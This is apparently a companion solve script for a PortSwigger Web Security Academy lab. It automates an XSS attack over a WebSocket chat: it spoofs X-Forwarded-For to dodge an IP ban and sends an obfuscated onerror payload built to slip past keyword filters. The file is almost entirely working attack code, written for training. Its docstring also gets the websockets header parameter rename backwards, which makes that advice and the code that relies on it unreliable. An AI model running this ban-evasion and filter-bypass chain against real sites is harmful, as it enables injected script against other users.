#!/usr/bin/env python3
"""
Manipulating the WebSocket handshake to exploit vulnerabilities
PortSwigger Web Security Academy -- WebSockets

Companion script for the writeup: 02-manipulating-websocket-handshake.md

What this does:
    Runs the full attack chain in order, exactly as we found it:
      1. Send the plain lab-1 payload with no bypass header -- confirms the
         server's XSS filter kills the connection and bans the source IP.
      2. Reconnect with a spoofed X-Forwarded-For and resend the plain
         payload -- proves the ban is keyed to that header, but the content
         filter itself is still live and blocks it from the new IP too.
      3. Reconnect again with a fresh X-Forwarded-For and send the obfuscated
         payload -- a mixed-case oNeRrOr handler (defeats the case-sensitive
         on[a-z]+= check) combined with window['al'+'ert'](1) (reconstructs
         alert() at runtime so the literal substring "alert" never appears).

Usage:
    python 02-manipulating-websocket-handshake.py <lab-url>
    e.g. python 02-manipulating-websocket-handshake.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx websockets

Note:
    websockets v13+ renamed the handshake header-injection parameter from
    additional_headers to extra_headers on websockets.connect() -- getting a
    custom X-Forwarded-For into the handshake at all depends on using that
    current API.
"""

import asyncio
import re
import sys
from urllib.parse import urlparse

import httpx
import websockets

PLAIN_PAYLOAD = "<img src=1 onerror='alert(1)'>"
OBFUSCATED_PAYLOAD = "<img src=1 oNeRrOr=window['al'+'ert'](1)>"


async def discover_ws_url(lab_url: str) -> str:
    host = urlparse(lab_url).hostname
    scheme = "wss" if lab_url.startswith("https") else "ws"

    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
        r = await client.get(lab_url)

    found = re.findall(r"""new\s+WebSocket\s*\(\s*['"`](wss?://[^'"`]+)['"`]\s*\)""", r.text)
    for url in found:
        if host in url:
            return url

    guess = f"{scheme}://{host}/chat"
    print(f"  [*] No WebSocket URL in page source, guessing: {guess}")
    return guess


async def send_message(ws_url: str, message: str, headers: dict | None = None) -> str:
    """Open one handshake with the given headers, send one chat message, return what came back."""
    try:
        async with websockets.connect(ws_url, extra_headers=headers, open_timeout=10) as ws:
            await ws.send('{"message":"%s"}' % message)
            try:
                return await asyncio.wait_for(ws.recv(), timeout=5)
            except asyncio.TimeoutError:
                return "[no response frame]"
    except Exception as e:
        return f"[handshake/connection error] {e}"


async def solve(lab_url: str) -> None:
    ws_url = await discover_ws_url(lab_url)
    print(f"[*] WebSocket endpoint: {ws_url}")

    print("[1/3] Plain payload, no bypass header -- expect the connection killed and the IP banned...")
    resp = await send_message(ws_url, PLAIN_PAYLOAD)
    print(f"      Response: {resp[:200]}")

    print("[2/3] Reconnect with X-Forwarded-For: 127.0.0.1, same plain payload -- "
          "confirms the ban is IP-header based, but the content filter is still live...")
    resp = await send_message(ws_url, PLAIN_PAYLOAD, headers={"X-Forwarded-For": "127.0.0.1"})
    print(f"      Response: {resp[:200]}")

    print(f"[3/3] Reconnect with a fresh X-Forwarded-For, send obfuscated payload: {OBFUSCATED_PAYLOAD}")
    resp = await send_message(ws_url, OBFUSCATED_PAYLOAD, headers={"X-Forwarded-For": "10.0.0.2"})
    print(f"      Response: {resp[:200]}")

    await asyncio.sleep(3)  # give the simulated support agent time to render the message

    async with httpx.AsyncClient(verify=False) as client:
        check = await client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- alert(1) fired via oNeRrOr=window['al'+'ert'](1), "
              "IP ban and keyword filter both bypassed.")
    else:
        print("[-] Not solved yet -- inspect the responses above for filter/ban behaviour.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
